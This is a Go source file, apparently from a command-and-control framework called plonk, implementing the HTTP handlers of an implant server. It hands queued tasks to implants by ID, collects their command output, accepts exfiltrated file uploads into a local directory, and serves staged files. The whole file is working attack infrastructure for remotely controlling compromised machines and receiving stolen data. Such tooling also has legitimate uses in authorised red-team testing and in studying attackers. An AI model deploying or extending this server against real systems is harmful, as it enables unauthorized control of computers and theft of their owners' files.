package implantsvr

/*
 * handlers.go
 * HTTP Handlers
 * By J. Stuart McMurray
 * Created 20231207
 * Last Modified 20240123
 */

import (
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"io/fs"
	"log/slog"
	"net/http"
	"os"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"sync/atomic"
	"time"

	"github.com/magisterquis/plonk/internal/def"
	"github.com/magisterquis/plonk/lib/plog"
)

// serveMux returns an http.ServeMux suitable for use as an http.Server's
// handler.  It handles all of the implant endpoints.
func (s *Server) serveMux() *http.ServeMux {
	mux := http.NewServeMux()
	/* "Normal" handlers. */
	add := func(p string, f func(http.ResponseWriter, *http.Request)) {
		p += "/"
		mux.Handle(p, http.HandlerFunc(f))
	}
	add(def.FilePath, s.handleStaticFile)
	add(def.OutputPath, s.handleOutput)
	add(def.TaskPath, s.handleTasking)

	/* This can get switched off, for safety. */
	if 0 < s.ExfilMax {
		add(def.ExfilPath, s.handleExfil)
	}
	/* Don't want to need a trailing / for /c. */
	mux.Handle(def.CurlGenPath, http.HandlerFunc(s.handleCurlGen))
	/* Default handler reads index.html. */
	mux.HandleFunc("/", s.handleDefaultFile)

	return mux
}

// requestLogger returns s's logger with data relevant to r added.
func (s *Server) requestLogger(r *http.Request) *slog.Logger {
	sl := s.SL.With(
		def.LKHost, r.Host,
		def.LKMethod, r.Method,
		def.LKRemoteAddr, r.RemoteAddr,
		def.LKURL, r.URL.String(),
	)
	if nil != r.TLS {
		sl = sl.With(def.LKSNI, r.TLS.ServerName)
	}
	return sl
}

// handleTasking handles a request for tasking.
func (s *Server) handleTasking(w http.ResponseWriter, r *http.Request) {
	/* Set up logging and get the implant ID. */
	sl := s.requestLogger(r)
	id := getID(r)
	if "" == id { /* Need an ID. */
		return
	}
	sl = sl.With(def.LKID, id)

	/* Get the next task and note we've seen this one. */
	s.SM.Lock()
	defer s.SM.UnlockAndWrite()
	s.SM.C.Saw(id, r.RemoteAddr)
	s.logIfNew(id)
	q := s.SM.C.TaskQ[id] /* Task queue. */
	var t string          /* Task */
	if 0 != len(q) {      /* Get the next task. */
		t = q[0]
		s.SM.C.TaskQ[id] = slices.Delete(q, 0, 1)
		if 0 == len(s.SM.C.TaskQ[id]) {
			delete(s.SM.C.TaskQ, id)
		}
		sl = sl.With(def.LKTask, t)
	}
	sl = sl.With(def.LKQLen, len(s.SM.C.TaskQ[id]))

	/* Send it back and log it. */
	if "" != t {
		if _, err := io.WriteString(w, t+"\n"); nil != err {
			plog.WarnError(sl, def.LMTaskRequest, err)
			return
		}
	}
	if "" == t {
		sl.Debug(def.LMTaskRequest)
	} else {
		sl.Info(def.LMTaskRequest)
	}
}

// handleOutput handles a request to send back output.
func (s *Server) handleOutput(w http.ResponseWriter, r *http.Request) {
	/* Set up logging and get the implant ID. */
	sl := s.requestLogger(r)
	id := getID(r)
	if "" == id { /* Need an ID. */
		return
	}
	sl = sl.With(def.LKID, id)

	/* Note we've seen the implant. */
	noteSeen := func() {
		s.SM.Lock()
		s.SM.C.Saw(id, r.RemoteAddr)
		s.SM.Unlock()
		s.logIfNew(id)
	}
	noteSeen()

	/* Read chunks of output and make available for logging. */
	var (
		och      = make(chan string)
		ech      = make(chan error)
		shutdown atomic.Bool
	)
	go func() {
		defer close(och)
		defer close(ech)
		var (
			rbuf = make([]byte, def.OutputBuffer)
			err  error
			n    int
		)
		for nil == err && !shutdown.Load() {
			n, err = r.Body.Read(rbuf)
			if 0 != n {
				och <- string(rbuf[:n])
			}
			if nil != err {
				ech <- err
				return
			}
		}
	}()

	/* gotOutput keeps track of if we've seen any output at all, so as to
	not debug-log an empty read on the last EOF. */
	var gotOutput bool

	/* logOutput logs the output in o. */
	logOutput := func(o string) {
		/* Got output, send it back. */
		sl.With(
			def.LKOutput,
			strings.TrimRight(o, "\n"),
		).Info(def.LMOutputRequest)
		/* Note we did actually get output. */
		gotOutput = true
		/* Also note we've seen the implant. */
		noteSeen()
	}

	/* As we get output back, buffer until we've either got an error or
	have been waiting long enough. */
	var (
		ticker = time.NewTicker(def.OutputWait)
		last   = time.Now()
		obuf   bytes.Buffer
		tick   time.Time
		rerr   error
	)
	defer ticker.Stop()
	for nil == rerr && !shutdown.Load() {
		/* Wait until something happens. */
		select {
		case tick = <-ticker.C:
		case rerr = <-ech:
		case o := <-och:
			obuf.WriteString(o)
		case <-s.sdch: /* Server shutting down. */
			shutdown.Store(true)
		}
		/* If it's been long enough, send the output. */
		if 0 != obuf.Len() && (!tick.IsZero() ||
			time.Since(last) >= def.OutputWait) {
			last = time.Now()
			logOutput(obuf.String())
			obuf.Reset()
		}
		tick = time.Time{}
	}
	/* Finally got an error.  Make sure the output channel is empty and
	send the last output back. */
	if shutdown.Load() {
		/* Get whatever we've got from the channel. */
		var empty bool
		for !empty {
			select {
			case o, ok := <-och:
				if ok {
					obuf.WriteString(o)
				} else {
					empty = true
				}
			default:
				empty = true
			}
		}
		/* Drain the channels, as we can't really be sure they're
		closed without blocking the goroutine above. */
		go func() {
			for range ech {
			}
		}()
		go func() {
			for range och {
			}
		}()
	} else {
		for o := range och {
			obuf.WriteString(o)
		}
	}
	if 0 != obuf.Len() {
		logOutput(obuf.String())
	}

	/* If we got a read error, let someone know. */
	if nil != rerr &&
		!errors.Is(rerr, io.EOF) &&
		!errors.Is(rerr, io.ErrUnexpectedEOF) {
		plog.WarnError(sl, def.LMOutputRequest, rerr)
		return
	}

	/* If we just didn't get any output, log the request for debugging. */
	if !gotOutput {
		sl.Debug(def.LMOutputRequest)
	}
}

// handleExfil handles a request for a file upload.
func (s *Server) handleExfil(w http.ResponseWriter, r *http.Request) {
	sl := s.requestLogger(r)

	/* Get the requested filename, and make sure it's not / */
	rfn := strings.TrimPrefix(r.URL.EscapedPath(), def.ExfilPath)
	fn := s.exfilPath(rfn)
	if "" == fn {
		return
	}
	lfn := new(plog.AtomicString)
	lfn.Store(fn)
	sl = sl.With(
		def.LKFilename, lfn,
		def.LKReqPath, rfn,
	)

	/* Make sure we have the right directory for this file. */
	dn := filepath.Dir(fn)
	if err := os.MkdirAll(dn, def.DirPerms); nil != err {
		plog.ErrorError(
			sl, def.LMExfil, fmt.Errorf(
				"making exfil file's directory: %w",
				err,
			),
			def.LKDirname, dn,
		)
		return
	}

	/* Open a file with a unique name. */
	var f *os.File
	for i := 0; i < def.MaxExfilOpenTries; i++ {
		var err error
		/* Try the current name. */
		f, err = os.OpenFile(
			fn,
			os.O_CREATE|os.O_WRONLY|os.O_APPEND|os.O_EXCL,
			def.FilePerms,
		)
		if nil != f {
			defer f.Close()
			break
		}
		/* If it already exists, try another name. */
		if errors.Is(err, fs.ErrExist) {
			fn = lfn.Load() + "." + strconv.FormatInt(
				time.Now().UnixNano(),
				10,
			)
			continue
		}
		/* Something went wrong. */
		plog.ErrorError(
			sl, def.LMExfil, fmt.Errorf("opening file: %w", err),
		)
		return
	}
	/* Make sure we did actually get a file. */
	if nil == f {
		plog.ErrorError(
			sl, def.LMExfil, fmt.Errorf("no unused filename"),
		)
		return
	}
	lfn.Store(f.Name())

	/* Write the bytes to the file as well as taking a hash. */
	h := sha256.New()
	mw := io.MultiWriter(f, h)
	n, err := io.Copy(mw, io.LimitReader(r.Body, int64(s.ExfilMax)))
	if nil != err {
		plog.ErrorError(
			sl, def.LMExfil, fmt.Errorf("copy failed: %w", err),
			def.LKSize, n,
		)
		return
	}
	sl.Info(
		def.LMExfil,
		def.LKSize, n,
		def.LKHash, hex.EncodeToString(h.Sum(nil)),
	)
}

// handleStaticFile handles a request for a static file.
func (s *Server) handleStaticFile(w http.ResponseWriter, r *http.Request) {
	sl := s.requestLogger(r)
	/* Get the file path.  This is kind a hack, but could be worse? */
	var filename string
	http.StripPrefix(def.FilePath, http.HandlerFunc(func(
		_ http.ResponseWriter,
		r *http.Request,
	) {
		filename = r.URL.Path
	})).ServeHTTP(nil, r)
	sl = sl.With(def.LKFilename, filename)

	/* Pass the request to the fileserver. */
	iw := infoWriter{Wrapped: w}
	s.fh.ServeHTTP(&iw, r)

	/* Figure out how to log this thing. */
	if http.StatusOK == int(iw.StatusCode.Load()) {
		sl = sl.With(def.LKSize, iw.Written.Load())
	}
	if location := iw.Header().Get("location"); "" != location {
		sl = sl.With(def.LKLocation, location)
	}
	sl.Info(
		def.LMFileRequest,
		def.LKStatusCode, iw.StatusCode.Load(),
	)
}

// handleDefaultFile returns a file for anything not covered by other handlers,
// if we have one.
func (s *Server) handleDefaultFile(w http.ResponseWriter, r *http.Request) {
	/* See if we have the file. */
	f, err := os.Open(filepath.Join(s.Dir, def.DefaultFile))
	/* If it just doesn't exist, not much to do. */
	if errors.Is(err, fs.ErrNotExist) {
		return
	}
	/* Other errors get logged, but the response is the same. */
	if nil != err {
		plog.ErrorError(
			s.requestLogger(r),
			def.LMDefaultFileFailed,
			err,
		)
		return
	}
	defer f.Close()
	/* Sennd the contents of the default file back. */
	http.ServeContent(w, r, "", time.Time{}, f)
}

// logIfNew logs the first time a new implant is seen.
func (s *Server) logIfNew(id string) {
	if s.noSeen {
		return
	}
	/* If this isn't new, life's easy. */
	if _, loaded := s.seen.LoadOrStore(id, true); loaded {
		return
	}
	/* Log that we've seen it. */
	s.SL.Info(def.LMNewImplant, def.LKID, id)
}

// getID gets the ID part of the URL in r.  It returns the empty string if
// there is no ID.
func getID(r *http.Request) string {
	/* Split into path (e.g. /t), ID, and rest. */
	parts := strings.SplitN(
		strings.TrimLeft(r.URL.EscapedPath(), "/"),
		"/",
		3,
	)
	/* If we have an ID, return it. */
	switch len(parts) {
	case 0, 1:
		return ""
	default:
		return parts[1]
	}
}

// exfilPath gets the path to the exfilled file f.  If it's unsuitable,
// exfilPath returns the empty string.
func (s *Server) exfilPath(f string) string {
	f = filepath.Join(".", filepath.FromSlash(f))
	f = filepath.Clean(f)
	if !filepath.IsLocal(f) {
		return ""
	}
	ed := filepath.Join(s.Dir, def.ExfilDir)
	f = filepath.Join(s.Dir, def.ExfilDir, f)
	if f == ed || !strings.HasPrefix(f, ed) {
		return ""
	}
	return f
}
